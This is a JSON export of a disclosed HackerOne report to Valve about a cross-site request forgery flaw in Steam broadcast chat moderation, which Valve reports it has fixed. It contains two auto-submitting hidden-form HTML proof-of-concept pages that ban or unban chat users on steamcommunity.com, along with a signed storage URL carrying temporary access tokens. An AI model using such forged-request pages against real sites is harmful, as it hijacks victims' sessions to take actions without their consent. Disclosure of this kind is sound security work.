{"id":381237,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODEyMzc=","url":"https://hackerone.com/reports/381237","title":"CSRF | Ban or unban users in broadcast's chat","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2018-07-13T12:28:25.015Z","submitted_at":"2018-07-13T12:28:25.015Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"romesful","url":"/romesful","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/27eDG31JK1gpngZrgRjFNw9c/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23363,"url":"https://hackerone.com/valve","handle":"valve","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Valve","twitter_handle":"","website":"https://www.valvesoftware.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-01-07T20:07:39.180Z","bug_reporter_agreed_on_going_public_at":"2018-10-08T18:42:36.261Z","team_member_agreed_on_going_public_at":"2019-01-07T20:07:39.121Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"#Steps to reproduce\n* Start broadcast\n* Attacker needs to craft special HTML page\n* Get broadcast's steam id(it contains in URL: `https://steamcommunity.com/broadcast/watch/{STEAM ID}/`\n* If attacker wants to unban somebody, he needs to create HTML page like this:\n\n```\n\u003ciframe style=\"display:none\" name=\"csrf-frame\"\u003e\u003c/iframe\u003e\n\u003cform action=\"https://steamcommunity.com/broadcast/ajaxupdateusermute/\" method=\"POST\" target=\"csrf-frame\" id=\"csrf-form\"\u003e\n\u003cinput type=\"hidden\" name=\"broadcaststeamid\" value=\"{STEAM ID}\"\u003e\n\u003cinput type=\"hidden\" name=\"issuersteamid\" value=\"{STEAM ID}\"\u003e\n\u003cinput type=\"hidden\" name=\"chattersteamid\" value=\"{USER'S STEAM ID TO UNBAN}\"\u003e\n\u003cinput type=\"hidden\" name=\"bantype\" value=\"0\"\u003e\n\u003cinput type=\"hidden\" name=\"duration\" value=\"0\"\u003e\n\u003cinput type=\"hidden\" name=\"perm\" value=\"0\"\u003e\n\u003c/form\u003e\n\u003cscript\u003edocument.getElementById(\"csrf-form\").submit()\u003c/script\u003e\n\u003chtml\u003e\n\u003chead\u003e\n    \u003ctitle\u003eUnban in chat - CSRF\u003c/title\u003e\n\u003c/head\u003e\n\n\u003cbody\u003e\n\u003ch1\u003eSomebody was unbanned silently :/\u003c/h1\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n* If attacker wants to permanently ban somebody, he needs to create HTML page like this:\n\n```\n\u003ciframe style=\"display:none\" name=\"csrf-frame\"\u003e\u003c/iframe\u003e\n\u003cform action=\"https://steamcommunity.com/broadcast/ajaxupdateusermute/\" method=\"POST\" target=\"csrf-frame\" id=\"csrf-form\"\u003e\n\u003cinput type=\"hidden\" name=\"broadcaststeamid\" value=\"{STEAM ID}\"\u003e\n\u003cinput type=\"hidden\" name=\"issuersteamid\" value=\"{STEAM ID}\"\u003e\n\u003cinput type=\"hidden\" name=\"chattersteamid\" value=\"{USER'S STEAM ID TO BAN}\"\u003e\n\u003cinput type=\"hidden\" name=\"bantype\" value=\"1\"\u003e\n\u003cinput type=\"hidden\" name=\"duration\" value=\"0\"\u003e\n\u003cinput type=\"hidden\" name=\"perm\" value=\"1\"\u003e\n\u003c/form\u003e\n\u003cscript\u003edocument.getElementById(\"csrf-form\").submit()\u003c/script\u003e\n\u003chtml\u003e\n\u003chead\u003e\n    \u003ctitle\u003eBan in chat - CSRF\u003c/title\u003e\n\u003c/head\u003e\n\n\u003cbody\u003e\n\u003ch1\u003eSomebody was banned silently :/\u003c/h1\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n* After that broadcast's creator needs to visit Attacker's page.\n* And somebody will be banned/unbanned.\n\n#Video PoC\n*I banned myself, because i don't have third Steam account\n{F320189}\n\n#Fix\nAdd sessionid parameter to POST request, like this implemented in others requests.\n\n## Impact\n\nAttacker can permanently ban or unban other users.","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":320189,"file_name":"bandicam_2018-07-13_15-05-58-799.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/320/189/2730648810f64a495a01aa3d425510ee5cd12563/bandicam_2018-07-13_15-05-58-799.mp4?response-content-disposition=attachment%3B%20filename%3D%22bandicam_2018-07-13_15-05-58-799.mp4%22%3B%20filename%2A%3DUTF-8%27%27bandicam_2018-07-13_15-05-58-799.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145312Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=70bee9748bf8fc222913d56d10c2eb7ef877babee39f9e86583a610de91670d1","file_size":4752410,"type":"video/mp4"}],"allow_singular_disclosure_at":null,"vote_count":9,"voters":["njbooher","vp40","romesful","ali","emitrani","sudi","r3y","japz","cryptographer"],"severity":{"rating":"low","score":3.5,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"required","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":2430,"asset_type":"URL","asset_identifier":"steamcommunity.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3058024,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @romesful ,\n\nThanks for your submission. We are currently reviewing your report and will get back to you once we have additional information to share.\n\nKind regards,\n@pieceoftoast","automated_response":false,"created_at":"2018-07-17T16:30:53.538Z","updated_at":"2018-07-17T16:30:53.538Z","actor":{"username":"pieceoftoast","cleared":false,"url":"/pieceoftoast","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/304/250/1d56f264cfce92a8f88b8424ce9dc273ab4bcd63_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3058228,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-07-17T17:30:56.876Z","updated_at":"2018-07-17T17:30:56.876Z","additional_data":{"old_severity":"Low","new_severity":"Low (3.5)","old_severity_id":182608,"new_severity_id":184028},"actor":{"username":"pieceoftoast","cleared":false,"url":"/pieceoftoast","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/304/250/1d56f264cfce92a8f88b8424ce9dc273ab4bcd63_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3058229,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"@romesful, thank you for your submission! Your report has been validated, and it has been submitted to the appropriate remediation team for review. They will let the HackerOne triage team know the final ruling on this report, and if/when a fix will be implemented. The HackerOne triage team will follow-up after the remediation team has assessed the impact of this report. Please note that the status and severity are subject to change.","automated_response":false,"created_at":"2018-07-17T17:31:00.489Z","updated_at":"2018-07-17T17:31:00.489Z","actor":{"username":"pieceoftoast","cleared":false,"url":"/pieceoftoast","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/304/250/1d56f264cfce92a8f88b8424ce9dc273ab4bcd63_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3083854,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any updates?","automated_response":false,"created_at":"2018-07-23T11:56:40.451Z","updated_at":"2018-07-23T11:56:40.451Z","actor":{"username":"romesful","cleared":false,"url":"/romesful","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/27eDG31JK1gpngZrgRjFNw9c/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3124165,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-07-31T23:54:21.666Z","updated_at":"2018-07-31T23:54:21.666Z","actor":{"url":"/valve","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Valve"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"valve","collaborator":{"username":"romesful","url":"/romesful"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3124167,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for the report, we have deployed a fix for the issue.","automated_response":false,"created_at":"2018-07-31T23:54:37.260Z","updated_at":"2018-07-31T23:54:37.260Z","actor":{"username":"chrisk","cleared":false,"url":"/chrisk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"romesful","url":"/romesful"},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3450610,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"I want to disclose this one.  Can we do it?","automated_response":false,"created_at":"2018-10-08T18:42:36.288Z","updated_at":"2018-10-08T18:42:36.288Z","first_to_agree":true,"actor":{"username":"romesful","cleared":false,"url":"/romesful","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/27eDG31JK1gpngZrgRjFNw9c/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3938357,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-01-07T20:07:39.139Z","updated_at":"2019-01-07T20:07:39.139Z","actor":{"username":"spacecore","cleared":false,"url":"/spacecore","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/HEZj9dxuvXmEYBRfi6xzVDpD/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3938358,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-01-07T20:07:39.204Z","updated_at":"2019-01-07T20:07:39.204Z","actor":{"username":"spacecore","cleared":false,"url":"/spacecore","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/HEZj9dxuvXmEYBRfi6xzVDpD/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}